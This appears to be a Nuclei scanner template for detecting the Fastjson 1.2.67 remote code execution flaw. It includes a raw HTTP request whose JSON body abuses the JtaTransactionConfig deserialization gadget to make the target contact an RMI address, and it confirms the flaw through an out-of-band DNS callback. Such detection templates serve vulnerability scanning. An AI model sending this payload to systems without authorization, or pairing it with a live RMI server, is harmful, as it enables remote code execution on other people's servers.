id: fastjson-1-2-67-rce
info:
  name: Fastjson 1.2.67 - Remote Code Execution
  author: zh
  severity: critical
  description: Fastjson version 1.2.67 is prone to a vulnerability that allows remote
    code execution.
  reference:
  - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
  - https://github.com/wyzxxz/fastjson_rce_tool
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: fastjson,rce,deserialization,oast
  metadata:
    impact: The impact of the Fastjson 1.2.67 remote code execution vulnerability
      is the potential for unauthorized parties to execute malicious code on affected
      systems.
    recommendation: It is recommended to update to a newer version of Fastjson to
      mitigate the risk of the remote code execution vulnerability.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"\
    ,\n   \"properties\":{\n      \"@type\":\"java.util.Properties\",\n      \"UserTransaction\"\
    :\"rmi://{{interactsh-url}}/Exploit\"\n   }\n}\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: status
    negative: true
    status:
    - 200
